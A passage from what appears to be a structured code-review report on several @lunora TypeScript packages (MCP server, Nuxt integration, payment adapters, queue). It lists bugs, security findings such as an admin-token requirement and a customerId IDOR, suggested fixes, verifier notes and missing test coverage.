- from-env.ts createCaptureSink: no test for a non-2xx or `{ error }` shard response — the current silent-success-on-failure behavior is untested and unnoticed.
- inbound/parse.ts: no fixture with a folded (multi-line) header such as a real Received or DKIM-Signature header — if postal-mime ever surfaced retained fold characters, assertSafeHeaderValue would bounce every real message, and nothing would catch it.
- inbound/parse.ts formatAddress: the RFC 5322 group-syntax branch (`Team: a@x, b@x;` → flattened member list, lines 104-110) has no test.
- create-mailer.ts: no test that mailer.queue() with a `react` element renders html/text BEFORE enqueueing (the documented reason the queue payload drops `react`) — only send() covers the react path.
- inbound/parse.ts: no test with a ReadableStream input — the one shape a real Cloudflare Email Worker actually passes (`message.raw`); only string and ArrayBuffer are covered.
- testing.ts extractLink: no test against html produced by the package's own renderEmail (which entity-escapes `&` in hrefs), so the &amp;-broken-URL bug is invisible to the suite.
- queue.ts consumeQueuedSend: the lone-string cc/bcc normalization branch (lines 96-98) is untested.

<a id="lunoramcp"></a>

### @lunora/mcp

**Assessment:** A small, well-engineered package: the read-only-by-default posture is enforced both at tool advertisement and at dispatch, run tools are allowlisted against discovered public functions, and input coercion is deliberate and commented. The real problems are a documentation/design mismatch around the admin token (the "least-privilege token" advice is inoperable because every tool path hits admin-gated endpoints) and a result-serialization gap where bigint/bytes values from the Lunora wire codec break or silently corrupt tool output.

#### 1. [MEDIUM / bug] ok() JSON.stringify throws on bigint results and silently mangles bytes, turning successful calls into tool errors

`packages/mcp/src/tools.ts:144`

client.query/mutation/action return decodeWire(body.result) (packages/client/src/lunora-client.ts:3373), which revives v.int64() values as real bigint and bytes columns as ArrayBuffer/typed arrays. ok() at packages/mcp/src/tools.ts:144 does JSON.stringify(value, undefined, 2): a bigint anywhere in the result throws TypeError ("Do not know how to serialize a BigInt"), which the catch at line 233 converts into an isError result — so a function that SUCCEEDED is reported to the model as a failure with a cryptic message. An ArrayBuffer serializes as {} and a Uint8Array as an index-keyed object — silent data corruption in the model-visible output. Failure scenario: lunora_run_query on any function returning an int64 field always errors; the agent retries or gives up despite the deployment answering correctly.

**Suggested fix:** Pass a replacer to JSON.stringify that maps bigint → v.toString() (or a tagged form) and ArrayBuffer/typed arrays → base64, mirroring the client wire codec's leaf handling; add a test with a bigint-bearing mock result.

#### 2. [MEDIUM / security] "Least-privilege token" guidance is inoperable — every tool path requires the admin bearer, so a read-only MCP server must hold the full admin token

`packages/mcp/src/server.ts:79`

The docs at packages/mcp/src/server.ts:79-80 ("Prefer a LEAST-PRIVILEGE token here, not the admin token") and packages/mcp/src/run-bin.ts:9 tell operators not to configure the admin token. But lunora_list_functions, lunora_list_tables, and lunora_get_function_schema call client.listFunctions()/listGlobalTables(), which hit the admin-gated /_lunora/admin/functions and /_lunora/admin/global/tables endpoints (packages/client/src/lunora-client.ts:1785,1998 via adminFetch; gate in packages/runtime/src/introspection-admin-routes.ts:113 + create-worker.ts adminToken). Worse, assertRunnable (packages/mcp/src/tools.ts:157) calls listFunctions() before EVERY run tool, so even lunora_run_query fails with ADMIN_FORBIDDEN under a non-admin token. Failure scenario: an operator follows the documented advice and sets a scoped app token → all six tools return errors; the only working configuration is LUNORA_ADMIN_TOKEN = the actual admin token, meaning a "read-only" MCP process holds a credential that can also drive admin import/export/mutation endpoints, with the read-only guarantee enforced only client-side in this process.

**Suggested fix:** Either fix the docs to state the admin token is required and the read-only gate is the mitigation, or (better) make the allowlist optional/configurable so the run tools can work with a non-admin token (e.g. skip assertRunnable when listFunctions returns ADMIN_FORBIDDEN, relying on the server's own public-function routing), and have the runtime expose a non-admin read-only introspection scope.

#### 3. [LOW / bug] Non-object `args` is silently coerced to {} instead of returning an error result

`packages/mcp/src/tools.ts:126`

readRunArguments (packages/mcp/src/tools.ts:124-126) coerces any non-plain-object args — including a JSON-stringified object, which LLMs very commonly emit (args: "{\"limit\":5}") — to an empty bag and proceeds to invoke the function. For a function whose args are all optional (e.g. a paginated list query), the call silently succeeds with defaults and returns unexpected results; the model gets no signal that its arguments were discarded. For required args the server validator rejects, but with a "missing argument" message that misdirects the model away from the actual mistake (wrong args type). The coercion is commented as intentional to avoid forwarding malformed payloads, but an isError result naming the problem achieves that safety without the silent-misbehavior mode.

**Suggested fix:** When `args` is present but not a plain object, return an isError ToolResult like 'args must be a JSON object, got string' (optionally attempt JSON.parse of a string first) instead of coercing to {}.

#### 4. [LOW / perf] assertRunnable re-fetches the entire function list over the network on every run-tool call

`packages/mcp/src/tools.ts:157`

Every lunora_run_query/mutation/action call performs client.listFunctions() (a full HTTP round trip to /_lunora/admin/functions returning every public function descriptor including arg schemas) before the actual RPC — two sequential round trips per tool call, with no caching. lunora_get_function_schema (line 193) does the same. An agent making a burst of queries doubles its latency and hammers the admin endpoint with identical responses. The function registry is static per deployment, so a short-TTL cache is safe.

**Suggested fix:** Memoize the listFunctions() result per callTool/client with a small TTL (e.g. 30-60s) or cache the in-flight promise so concurrent calls share one fetch; freshness only matters across redeploys.

#### Missing test coverage

- Result serialization of non-plain-JSON values: no test feeds a bigint or ArrayBuffer/Uint8Array result through ok()/callTool (the JSON.stringify throw path in packages/mcp/src/tools.ts:144 is unexercised).
- isEnvEnabled variants in packages/mcp/src/run-bin.ts:21: only LUNORA_MCP_ALLOW_WRITES="true" is tested; no coverage that "0"/"false"/"" stay disabled or that " YES "/"On" (trim + case-fold) enable writes.
- resolveVersion in packages/mcp/src/server.ts:21-54: no test that SERVER_INFO picks up the real package version via the walk-up, skips a non-@lunora/mcp package.json, or falls back to "0.0.0".
- assertRunnable kind-mismatch and NOT_FOUND paths are only tested through lunora_run_query; no test rejects a query path sent to lunora_run_mutation/lunora_run_action, and no positive-path test for lunora_run_action forwarding a shardKey.
- lunora_list_tables has no test at all (tools.test.ts never calls it; listGlobalTables mock is unused).
- The runtime guard against a truthy non-boolean allowWrites (the `=== true` comparisons at packages/mcp/src/tools.ts:104 and :181, each carrying an eslint-disable justifying the guard) is untested — no test passes the string "false" and asserts writes stay gated.
- The write-tool refusal when allowWrites is false but the tool name is lunora_run_action (only lunora_run_mutation is covered at tools.test.ts:236).

<a id="lunoranuxt"></a>

### @lunora/nuxt

**Assessment:** The package is small (~421 LOC), well-factored, and its three runtime seams (Cloudflare env resolution, h3 v1/v2 request extraction, worker delegation) are cleanly separated and directly unit-tested; no security issues were found and the delegation logic itself is correct. The real problems are consistency drift, not logic: the shipped README/docs teach a deploy wrapper filename (`exports.cloudflare.ts`) that contradicts what the code checks for and the template uses (`worker.ts`), the h3 devDependency pins the empty v2 stub the package's own docs warn against (forcing a @ts-ignore that exempts the main handler from type-checking), and module.ts — the largest source file — has zero test coverage.

#### 1. [MEDIUM / bug] Package docs teach `exports.cloudflare.ts` while the module code and template require `worker.ts` — contradictory setup guidance and a spurious warning

`packages/nuxt/README.md:62`

src/module.ts:179 checks `existsSync(join(rootDir, "worker.ts"))` and warns users to create a root `worker.ts` wrapper (matching templates/nuxt/worker.ts and its wrangler.jsonc `"main": "worker.ts"`). But the package's own README.md:62-66 and docs/index.mdx:40-43 instruct users to instead create `exports.cloudflare.ts`, and the internal docstrings in src/runtime/handler.ts:11 and src/runtime/server/lunora.ts:12 repeat the `exports.cloudflare.ts` story. Failure scenario: a user follows the shipped README, creates `exports.cloudflare.ts`, and (a) gets the 'missing worker.ts' warning on every build even though they followed the docs, and (b) per module.ts's own header comment (lines 10-12, 'Nitro's cloudflare_module output exports only the SSR handler'), nothing in the Nuxt cloudflare_module pipeline appends `exports.cloudflare.ts`'s exports to the worker entry — so `wrangler deploy` fails on the missing `ShardDO` DO class export. The docs describe a hook the nuxt preset doesn't have (the README itself lists it as an unverified assumption at line 105).

**Suggested fix:** Rewrite packages/nuxt/README.md and docs/index.mdx to the `worker.ts` wrapper convention the module and template actually implement (or make the module.ts:179 check accept either filename if both are meant to be supported), and fix the stale `exports.cloudflare.ts` mentions in src/runtime/handler.ts and src/runtime/server/lunora.ts docstrings.

#### 2. [MEDIUM / bug] devDependency pins h3@^2.0.0 — the deprecated empty stub the package's own docs warn against — leaving the Nitro handler untype-checked behind a @ts-ignore

`packages/nuxt/package.json:77`

package.json:77 dev-deps `"h3": "^2.0.0"`, but docs/index.mdx:137-139 states plainly that npm's h3@2.0.0 is 'a deprecated stub with no code, exports, or type declarations (the real v2 line is still prerelease-only)' and tells users to pin ^1.15.11. Because the installed devDep has no type declarations, `import * as h3 from "h3"` in src/runtime/server/lunora.ts:27 cannot be resolved by tsc and is suppressed with @ts-ignore (line 26), so the entire Nitro handler — the package's actual entry seam — is excluded from `lint:types`. A signature drift in `defineEventHandler` usage or `resolveWebRequest(h3, event)` would ship silently. Related staleness: src/runtime/h3-request.ts:6-7 and **tests**/h3-request.test.ts:7 both claim the peer range is `h3: "^1.0.0 || ^2.0.0"`, but package.json:82 declares `"h3": "^1.15.0"` — with that peer, the v2 `event.req` branch in resolveWebRequest is unreachable for any peer-satisfying install, and the comments mislead maintainers about what is supported.

**Suggested fix:** Pin the devDependency to the real v1 line (^1.15.11) so tsc gets h3's types, remove the @ts-ignore in src/runtime/server/lunora.ts, and correct the '^1.0.0 || ^2.0.0' peer-range claims in src/runtime/h3-request.ts and its test to match the actual peer (^1.15.0, v2 branch kept as forward-compat).

#### 3. [LOW / bug] resolveTildePath leaves relative appEntry specifiers (./lunora/server) unresolved, hitting the exact Nitro re-resolution failure the helper exists to prevent

`packages/nuxt/src/module.ts:66`

resolveTildePath (src/module.ts:66-76) expands `~/` and `~~/` but returns everything else untouched, and the result is written into `nuxt.options.alias["#lunora/app"]` (line 151). The helper's own docstring explains why absolutes are required: Nitro re-resolves non-absolute alias targets against its OWN srcDir (`server/`), aborting the server build. A user who configures `lunora: { appEntry: "./lunora/server" }` or `"../shared/lunora/server"` — a perfectly natural way to write a project path — gets that same broken Nitro resolution with a confusing 'Cannot resolve' bundler error and no hint from the module. Relative specifiers are unambiguous (they can never be npm package names), so they can safely be resolved against rootDir just like tildes.

**Suggested fix:** In resolveTildePath, also resolve specifiers starting with `./` or `../` against rootDirectory (e.g. `join(rootDirectory, specifier)`), keeping only bare package specifiers and absolute paths untouched.

#### Missing test coverage

- src/module.ts has no tests at all (185 of ~421 LOC): the `setup()` wiring — `#lunora/app` alias registration, the nitro:config hook injecting the rollup plugin while preserving pre-existing plugins, addServerHandler route construction from `options.prefix`, and the worker.ts warning firing only when the file is absent — is entirely unexercised.
- resolveTildePath (src/module.ts:66-76): no test for the `~~/` rootDir branch vs the `~/` srcDir branch vs the untouched absolute/bare passthrough — the distinction is exactly what the Nitro-build correctness depends on.
- lunoraTsSourceResolver.resolveId (src/module.ts:95-115): no test for any branch — `#lunora/*.js` mapping to rootDir/lunora/*.ts, relative `.js` import rewritten to a sibling `.ts` via the importer's dirname, the strict no-op when no `.ts` sibling exists, and non-`.js` specifiers returning undefined.
- resolveCloudflare (src/runtime/cloudflare.ts:62): the runtime-shape alias fallback `fromRuntime.ctx ?? fromRuntime.context` is untested — tests cover the ctx/context alias only for the legacy `event.context.cloudflare` shape, not for `event.req.runtime.cloudflare` carrying `context` instead of `ctx`.
- resolveCloudflare precedence: no test that the legacy `event.context.cloudflare` shape wins when both shapes are present on the same event (the documented ordering at src/runtime/cloudflare.ts:52-65).
- src/server.ts re-export surface: no test imports the `@lunora/nuxt/server` entry, so a renamed or dropped export in `@lunora/client/ssr` (e.g. `preloadedQueryResult`, `getServerSession`) would only surface in a consumer's build, not in this package's CI.

<a id="lunorapayment"></a>

### @lunora/payment

**Assessment:** The package is well-engineered overall — fail-closed provider state mappings, constant-time signature comparison, inbound/outbound idempotency with claim rollback, defensive JSON reading, and an unusually thorough regression-style test suite. The real defects cluster in three places: reconciliation blindly trusts provider snapshots that adapters render incompletely (Stripe/Dodo refund erasure, Polar referenceId wipe), the Polar checkout path drops the customer linkage the facade carefully establishes, and the facade trusts a caller-supplied customerId despite explicitly defending against the same IDOR on the portal path.

#### 1. [HIGH / bug] Polar createCheckout drops the customer linkage: ignores input.customerId and input.email, hardcodes customerEmail: undefined — **verified: confirmed**

`packages/payment/src/providers/polar.ts:217`

The facade's `startCheckout` (create-payment.ts:123-134) goes to great lengths to reuse or mint a provider customer and passes `customerId` into `adapter.createCheckout`. The Polar adapter throws all of it away: `checkouts.create` is called with `customerEmail: undefined` and no `customerId`/`externalCustomerId` (polar.ts:215-225), so the hosted checkout is not attached to the customer that was just created via `getOrCreateCustomer` and stored. Polar then mints a _second_ customer when the buyer completes checkout. Consequences: (1) `createPortalSession` derives the customer from the store (create-payment.ts:251) and opens a billing portal for the orphaned first customer that has no subscription — the user cannot see or cancel their plan; (2) `reportUsage` keys ingestion on `externalCustomerId: referenceId` (polar.ts:304), which was set on the orphaned customer, not the one holding the subscription, so metered usage may not bill. `input.quantity` and `input.cancelUrl` are also silently dropped.

**Suggested fix:** Pass `customerId: input.customerId` (and/or `externalCustomerId: input.referenceId`, `customerEmail: input.email`) to `client.checkouts.create` so the checkout binds to the stored customer.

**Verifier note:** Confirmed at every step. (1) polar.ts createCheckout (lines 215-225) hardcodes customerEmail: undefined and passes no customerId/externalCustomerId/email — input.customerId and input.email are demonstrably dropped. (2) The facade's startCheckout (create-payment.ts:113-153) mints/reuses a provider customer (Polar getOrCreateCustomer sets externalId=referenceId), stores it, and passes customerId into adapter.createCheckout — Polar alone ignores it, while Stripe/Creem/Dodo all wire input.customerId into their checkout calls, establishing the intended contract. (3) The Polar SDK supports the linkage: the adapter type-checks against the real Polar client, so the compiling `customerEmail:` literal proves checkouts.create accepts it, and Polar 0.48's CheckoutCreate also carries customerId/externalCustomerId (Polar's documented external-customer linkage). (4) No self-heal: the webhook applier (sync.ts) upserts only payment sessions and subscriptions — never customers — and reconcile.ts sweeps only subscriptions/payments, so store.getCustomerByReference permanently returns the orphaned pre-checkout customer. (5) Consequences hold: createPortalSession (create-payment.ts:251) derives the customer from the store and opens a Polar customerSessions portal for the orphan with no subscription (critical for an MoR provider where the portal is the self-serve cancel path), and reportUsage (polar.ts:304) keys ingestion on externalCustomerId=referenceId, which only the orphaned customer carries, so metered usage attaches to the wrong customer and may not bill. (6) No test pins customerEmail: undefined as intentional — the sole checkout test passes no customerId/email. Only peripheral weakening: cancelUrl (and quantity) have no counterpart in Polar's checkout-create API, so dropping those two is not itself a defect. Core finding is real; severity high is appropriate for a payments-integration bug causing duplicate provider customers, a broken billing portal, and silently miskeyed metered billing.

#### 2. [MEDIUM / bug] Reconcile erases refunds: Stripe/Dodo getPaymentStatus never reflects refunded state, and reconcile trusts it as authoritative — **verified: confirmed**

`packages/payment/src/providers/stripe.ts:132`

reconcile.ts documents that "the provider is authoritative" and overwrites the store on drift (reconcile.ts:76 spreads `current` wholesale). But `intentToSession` hardcodes `refundedAmount: zeroMoney(currency)` (stripe.ts:132) and `PAYMENT_STATE_BY_STRIPE_STATUS` has no refund mapping — correct for Stripe, since a refunded PaymentIntent keeps status `succeeded` (refunds live on the charge, which is never fetched). Failure scenario: a `charge.refunded` webhook correctly marks a session `refunded` in the store; a later reconcile sweep including that session sees provider-truth state `captured` / refundedAmount 0, `paymentDrifted` fires on the state mismatch, and the store is overwritten back to `captured` with the refund total erased — the sweep designed to repair drift _creates_ drift, and a refunded/charged-back customer can regain product access via `hasActivePrice`-style reads of payment state. `paymentFromDodo` (dodopayments.ts:134) has the identical defect (`refundedAmount` always zero, no refunded status in `PAYMENT_STATE_BY_DODO_STATUS`).

**Suggested fix:** In the Stripe adapter, expand `latest_charge` on `paymentIntents.retrieve` and read `amount_refunded`/`refunded` into `refundedAmount`/state; for Dodo, list refunds for the payment or read its refund fields. Alternatively make `reconcilePayment` never regress refund fields (max-merge refundedAmount, refuse captured←refunded transitions).

**Verifier note:** The core mechanism is confirmed in code. (1) Stripe: `getPaymentStatus` (packages/payment/src/providers/stripe.ts:326) returns `intentToSession(paymentIntents.retrieve(...))`, which hardcodes `refundedAmount: zeroMoney(currency)` (line 132) and maps only canceled/processing/requires_*/succeeded statuses (PAYMENT_STATE_BY_STRIPE_STATUS, lines 59-67) — no refunded/partially_refunded output is possible, and the charge (where Stripe records refunds) is never fetched. (2) Dodo: `paymentFromDodo` (dodopayments.ts:118-138) is identical — `refundedAmount` always zero, PAYMENT_STATE_BY_DODO_STATUS (lines 62-74) has no refund mapping. Contrast: the Creem and Polar adapters DO map refunded/partially_refunded in their status maps, so the reconcile contract clearly assumes getPaymentStatus reflects refunds. (3) reconcile.ts:47-50 flags drift on any state or refundedAmount mismatch, explicitly bypasses the FSM guard ("the provider is authoritative", lines 6-8), and line 76 overwrites the store wholesale with the provider snapshot — a webhook-applied refunded/partially_refunded row is reset to `captured` with refundedAmount 0. No test pins refund behavior through reconcile (reconcile.test.ts only exercises captured/active truth).

Refutation attempts that partially land: (a) `refunded` is in PAYMENT_TERMINAL_STATES (state-machine.ts:37) and the docs (docs/index.mdx:335-337, reconcile.ts:10-11) tell callers to sweep only non-terminal rows — so the exact headline scenario (fully-refunded session swept) requires a caller deviating from documented usage (nothing enforces it: PaymentStore has no list-payments method, id selection is entirely caller-side, and reconcile itself has no terminal-state guard; a race between id selection and a concurrent refund webhook also reaches it). However, `partially_refunded` is NOT terminal, so a Stripe partial refund (charge.refunded webhook → sync.ts applyPayment sets partially_refunded + refundedAmount) IS included in a fully docs-compliant non-terminal sweep and gets reset to captured/refundedAmount 0 — the defect is reachable under documented usage with no caller error. Once erased, the webhook can't reapply (event-id dedup), so the corruption is permanent. (b) The claimed entitlement escalation ("refunded customer regains access via hasActivePrice") is overstated: hasActivePrice (entitlements.ts:74-75) and the built-in `check` read only subscriptions, never payment sessions, and Stripe subscription reconciliation is correct. Access regression applies only to apps reading payment-session state directly.

Verdict: real bug — reconcile erases refund accounting (guaranteed for partial refunds under documented usage; full refunds only via unenforced caller discipline or a race), but the built-in entitlement path is unaffected, so severity adjusts from high to medium.

#### 3. [MEDIUM / bug] Derived checkout idempotency key can exceed Stripe's 255-char limit and is collision-prone via unescaped ':' joining

`packages/payment/src/create-payment.ts:141`

The auto-derived key concatenates operation, provider, referenceId, priceId, mode, quantity, successUrl, cancelUrl, and `JSON.stringify(metadata)` joined with ':' (create-payment.ts:139-151, idempotency.ts:10). Two problems: (1) Stripe rejects idempotency keys longer than 255 characters, and two full URLs plus JSON metadata routinely exceed that — every checkout with realistic URLs/metadata fails with a Stripe API error (the comment explains why all fields were included, but not the length consequence). (2) Parts are not escaped, so distinct inputs can collide — e.g. successUrl "https://a/x:y" + cancelUrl "z" produces the same key as successUrl "https://a/x" + cancelUrl "y:z"; within Stripe's 24h idempotency window the second request returns the first (stale) session with the wrong redirect URLs.

**Suggested fix:** Hash the joined parts (SHA-256 hex via the WebCrypto already used in webhook.ts) and use `checkout:<provider>:<hash>` — fixed length, no delimiter ambiguity.

#### 4. [MEDIUM / bug] track mode:"set" is a non-atomic read-modify-write — concurrent sets over-count the ledger

`packages/payment/src/create-payment.ts:336`

`track({ mode: "set" })` computes `delta = target - await store.sumUsage(...)` and then appends the delta as a new ledger row (create-payment.ts:334-354). There is no transaction or version guard between the read and the append — the unique `by_idempotency` index only dedupes identical keys, and each call defaults to a fresh `crypto.randomUUID()`. Failure scenario: two concurrent `track({ mode: "set", quantity: 100 })` calls (e.g. two Worker isolates reconciling the same reference) both read current=40, both record +60, and the period total becomes 160 instead of 100 — `check` then denies a user who is actually under their limit, or (with a lowering set) the mirror-image under-count grants over-limit usage. Outside a single DO, `ctx.db` calls from Workers interleave across awaits, so this is reachable in the documented deployment.

**Suggested fix:** Perform set-reconciliation inside the store (a single DO/OCC-guarded operation that reads the sum and appends in one commit), or document that mode:"set" must only be called from a serialized context.

#### 5. [MEDIUM / security] Caller-supplied CheckoutInput.customerId is trusted verbatim — cross-tenant checkout attachment (IDOR)

`packages/payment/src/create-payment.ts:121`

`startCheckout` authorizes only `referenceId`, then does `let { customerId } = input; if (!customerId) { ...store lookup... }` (create-payment.ts:121-134). A present `customerId` skips the store-derived lookup entirely and is forwarded to the provider (e.g. Stripe `customer:` on the session, stripe.ts:297; Dodo `customer.customer_id`, dodopayments.ts:235). The same facade explicitly refuses this pattern elsewhere — `createPortalSession` says "never trust a caller-supplied customer id (IDOR)" (create-payment.ts:250) and metadata `referenceId` smuggling is stripped (line 119). Failure scenario: `ctx.payments.createCheckout` is exposed from a mutation with client-shaped input; an authenticated attacker passes their own `referenceId` plus a victim's `cus_...` id (enumerable/leaked), producing a hosted checkout bound to the victim's Stripe customer — exposing the victim's email/saved payment methods on the checkout page and attributing the charge to the victim's customer record while entitlements (pinned `metadata.referenceId`) land on the attacker.

**Suggested fix:** Ignore `input.customerId` unless it matches `store.getCustomerByReference(adapter.identifier, input.referenceId)?.id`, or drop the field from the public input and always derive from the store (same posture as createPortalSession).

#### 6. [LOW / bug] Polar orderToSession hardcodes referenceId: "" — reconcile wipes the stored session's owner attribution

`packages/payment/src/providers/polar.ts:122`

`orderToSession` sets `referenceId: ""` unconditionally (polar.ts:122) instead of reading `referenceFromMetadata(order)` (Polar propagates checkout metadata onto orders, and the adapter pins `referenceId` there at checkout, polar.ts:219). `reconcilePayment` upserts `{ ...current, createdAt: ... }` (reconcile.ts:76), so any drifted Polar payment session gets its correct `referenceId` (set by the `order.paid` webhook path, which does read metadata) overwritten with the empty string. The row becomes an orphan: the `by_reference` index no longer finds it, and the default authorizer explicitly never matches empty references (context.ts:66).

**Suggested fix:** Read `referenceFromMetadata(order)` in `orderToSession`, and/or make `reconcilePayment` preserve `existing.referenceId` when the provider snapshot has an empty one (same createdAt-preservation pattern already used).

#### 7. [LOW / refactor] Seven of twelve paymentTables are dead: nothing reads or writes products, prices, checkouts, payments, captures, refunds, invoices

`packages/payment/src/schema.ts:87`

`createDatabasePaymentStore` only touches `customers`, `paymentSessions`, `subscriptions`, `events`, and `usageEvents` (verified by grep over src/). The other seven tables (schema.ts:19-126) have no reader or writer anywhere in the package, yet the header instructs users to mirror ALL of these columns inline into their app `lunora/schema.ts`, and the doc claims "Captures and refunds are append-only records linked to a payment" — behavior that does not exist (refunds are folded into `paymentSessions.refundedMinor`). Every consuming app carries seven empty tables plus their unique indexes, and the docs describe a ledger that is never written.

**Suggested fix:** Delete the unused table definitions (or implement the append-only captures/refunds ledger the comment promises) and fix the header prose so users only mirror the five live tables.

#### 8. [LOW / reuse] Autumn adapter re-implements shared helpers: local notSupported instead of makeNotSupported, and readAny/readAnyNumber belong in json.ts

`packages/payment/src/providers/autumn.ts:98`

autumn.ts:98-100 defines its own `notSupported` thrower while polar/dodopayments/creem all use the shared `makeNotSupported` from providers/not-supported.ts (with a slightly divergent message format, so error text drifts per provider). autumn.ts:121-144 also defines `readAny`/`readAnyNumber` (first-defined-key readers) that are generic snake_case/camelCase tolerance helpers, sitting next to the package-wide defensive readers in json.ts; creem.ts solves the same casing problem with hand-rolled `?? readString(...)` chains (e.g. creem.ts:89, 104-105, 169-170) that these helpers would collapse.

**Suggested fix:** Move `readAny`/`readAnyNumber` into src/json.ts beside readString/readNumber and adopt them in creem.ts; replace autumn's local `notSupported` with `makeNotSupported("autumn")`.

#### Missing test coverage

- verifyStandardWebhook's replay-window branch is untested: no test sends a timestamp outside toleranceSeconds, exercises the whsec_-prefix base64 key decoding, or parses a multi-entry 'v1,<sig> v1,<sig2>' webhook-signature header (webhook.test.ts covers only constantTimeEqual and the empty-secret guard; provider tests only do one happy-path signature and one bad signature)
- Facade createPortalSession has no test: neither the store-derived customer path nor the NOT_FOUND when the reference has no stored customer (create-payment.ts:247-258) is exercised, despite being the documented anti-IDOR seam
- reconcile is never tested against a refunded payment session — a test where the store says 'refunded' and the adapter snapshot says 'captured' would have caught the Stripe/Dodo refund-erasure regression (reconcile.test.ts only covers missing rows, matching rows, and a failing id)
- track mode:'set' lowering usage (delta <= 0 stays local and is never forwarded to the provider, create-payment.ts:366) is untested — the only set-mode test raises the total; the negative-delta and delta===0 no-op branches have no coverage
- Stripe updateSubscription's item-id carry (retrieving the current subscription to patch items[0].id for a price/quantity change, stripe.ts:389-403) and resumeSubscription have no test in stripe.test.ts, while the equivalent Dodo logic has two dedicated regression tests
- Facade-level metadata referenceId stripping (stripReferenceId feeding both the derived idempotency key and the adapter call, create-payment.ts:119) is untested — the existing 'never lets caller metadata override' test only covers the Stripe adapter's own pin, not the facade seam that guards all providers

<a id="lunoraqueue"></a>

### @lunora/queue

**Assessment:** A small, carefully engineered package: the tricky delivery-semantics invariants (re-throwing the handler's original error, falsy throws, cyclic thrown values, dead-letter off-by-one, jurisdiction fail-closed, capture-sink timeout) are all explicitly handled and tested, and the null-prototype/Proxy hardening in createQueues shows deliberate attention to edge cases. Remaining issues are low-severity: one prototype-chain lookup that missed the same hardening, fully silent capture-failure modes, an undetected queue-name/binding collision, and ~40 lines of capture logic duplicated by hand from @lunora/mail.

#### 1. [MEDIUM / refactor] Dev-capture toggle and admin-RPC sink scaffolding duplicated by hand from @lunora/mail

`packages/queue/src/capture.ts:67`

DEV_ENVIRONMENT_PATTERN, ENVIRONMENT_VARS, the flag-parsing semantics of shouldCaptureQueue (capture.ts:24-25, 67-79), plus the sink skeleton (DEFAULT_ROOT_SHARD, `__lunora_admin__:` op constant, bearer-auth POST to `https://shard.internal/rpc`, jurisdiction handling) are byte-for-byte copies of packages/mail/src/from-env.ts:33-34, 69-80 and its createCaptureSink. The doc comment explicitly promises "mail and queue dev capture toggle the same way" — but that invariant is enforced only by hand, and a future edit to one env list/pattern silently diverges the two. The repo's top-level shared/ folder exists precisely for this zero-dependency-edge, bundler-inlined case (both packages must stay free of a mutual dep).

**Suggested fix:** Extract `shouldCapture(env, flagName)` (env-var list + dev pattern + flag parsing) and optionally a `postAdminRpc(env, op, args, opts)` helper into shared/ (e.g. shared/dev-capture.ts), imported by relative path from both @lunora/mail and @lunora/queue.

#### 2. [LOW / bug] Registry lookup walks the prototype chain for Object.prototype-named queues

`packages/queue/src/dispatch.ts:249`

dispatchQueueBatch resolves the entry with a plain `registry[batch.queue]`. The registry is emitted by codegen as an ordinary object literal (packages/codegen/src/emit.ts:2568), so a batch delivered from an undeclared queue named `constructor`, `toString`, or `hasOwnProperty` (all valid wrangler queue names, and `defineQueue({ name })` accepts them at define-queue.ts:69) resolves an inherited Object.prototype member instead of `undefined`. `entry === undefined` is then false, `entry.definition` is undefined, and `const { handler } = entry.definition` (line 258) throws `TypeError: Cannot destructure property 'handler' of undefined` instead of the directed LunoraError naming the known queues. Notably, create-queues.ts deliberately hardened the sibling producer map against exactly this pattern (null-prototype map + Object.hasOwn, create-queues.ts:31 and :54) — the consumer-side registry lookup missed the same treatment.

**Suggested fix:** Guard the lookup: `const entry = Object.hasOwn(registry, batch.queue) ? registry[batch.queue] : undefined;` so the misconfiguration surfaces as the intended directed error.

#### 3. [LOW / bug] Capture failures are completely invisible: non-2xx shard responses treated as success and sink rejections swallowed without any log

`packages/queue/src/capture.ts:130`

The capture sink awaits `stub.fetch(...)` but never checks `response.ok` and never consumes the response body — a 401 from a wrong/rotated LUNORA_ADMIN_TOKEN or a shard-side 500 is indistinguishable from success (the mail sink it mirrors, packages/mail/src/from-env.ts, at least reads `response.json()`). Compounding it, dispatchQueueBatch's guard (packages/queue/src/dispatch.ts:297-299) swallows any sink rejection with a bare `catch {}` — no console.warn, nothing. Failure scenario: in a dev environment (the whole point of the feature) with a stale admin token, the studio Queues panel simply stays empty with zero diagnostic anywhere; the developer cannot tell whether capture is off, misrouted, or rejected. Best-effort-by-contract is right for delivery semantics, but silent-by-contract for observability of the observability feature is a real DX bug. The discarded response body is also a workerd anti-pattern (unconsumed bodies trigger runtime warnings).

**Suggested fix:** Throw (or return a diagnostic) on `!response.ok` inside the sink, consume/cancel the body, and replace the bare `catch {}` in dispatchQueueBatch with a one-line `console.warn` (the handler-error re-throw path is already separate, so this cannot change delivery semantics).

#### 4. [LOW / bug] No uniqueness check anywhere for queue names / binding names — distinct exports can silently collide

`packages/queue/src/define-queue.ts:16`

queueBindingName maps distinct export names to the same binding: `emailQueue` and `email_Queue` both yield `QUEUE_EMAIL_QUEUE` (the camel-boundary regex inserts nothing around `_`, then uppercases). Separately, two exports may declare the same explicit `name:` override. Neither defineQueue, nor codegen discovery (packages/codegen/src/discover-queues.ts — no dedupe pass), validates cross-export uniqueness. For a duplicate `name`, the emitted LUNORA_QUEUE_REGISTRY object literal (packages/codegen/src/emit.ts:2568) contains duplicate string keys — silent last-wins under esbuild/Vite transpile-only builds — so one export's handler silently consumes the other queue's batches. Wrangler validation may catch the duplicate consumer/binding at deploy, but the registry shadowing is emitted regardless and the failure, if it reaches runtime, is a wrong-handler routing bug with no error.

**Suggested fix:** Add a uniqueness pass in discoverQueues (and optionally a runtime assertion when building the registry): reject two queues resolving to the same `name` or the same `bindingName` with a located diagnostic.

#### 5. [LOW / reuse] Camel-boundary naming regex duplicated six times across queue/workflow/container

`packages/queue/src/define-queue.ts:23`

The regex `/(?<=[a-z0-9])(?=[A-Z])/g` with the SCREAMING_SNAKE / kebab transforms appears in define-queue.ts:16 and :23, packages/workflow/src/define-workflow.ts:23 and :30, and packages/container/src/define-container.ts:107 and :116. All six are prefix-parameterized variants of the same two one-liners. Beyond the duplication, the shared behavior quirk (acronyms don't split: `HTMLQueue` → `QUEUE_HTMLQUEUE` / `htmlqueue`) is currently a property of six independent copies — a fix to one silently diverges binding-name derivation across the three define* families.

**Suggested fix:** Add shared/case.ts with `screamingSnake(name)` / `kebab(name)` (bundler-inlined, zero-dep per the shared/ rules) and have the three define* modules build their prefixed helpers from it.

#### Missing test coverage

- run-context.ts / ctx.run wiring: no test that a queue handler's ctx.run actually POSTs to /_lunora/scheduler/dispatch through the injected fetchImpl (DispatchOptions.fetchImpl → createQueueRunContext → createDispatchRunner passthrough is never exercised in this package; only ctx.log is touched in dispatch.test.ts:80).
